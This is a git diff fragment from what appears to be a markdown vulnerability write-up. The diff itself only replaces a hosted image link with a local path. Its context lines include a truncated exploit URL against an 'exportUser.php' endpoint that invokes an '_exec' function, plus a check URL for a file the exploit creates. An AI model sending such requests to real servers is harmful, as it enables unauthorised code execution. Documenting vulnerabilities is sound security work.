@@ -64,4 +64,4 @@ http://xxx.xxx.xxx.xxx/include/exportUser.php?type=3&cla=application&func=_exec&
 http://xxx.xxx.xxx.xxx/include/test.txt
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101951230.png)
+![](./images/202202101951230.png)
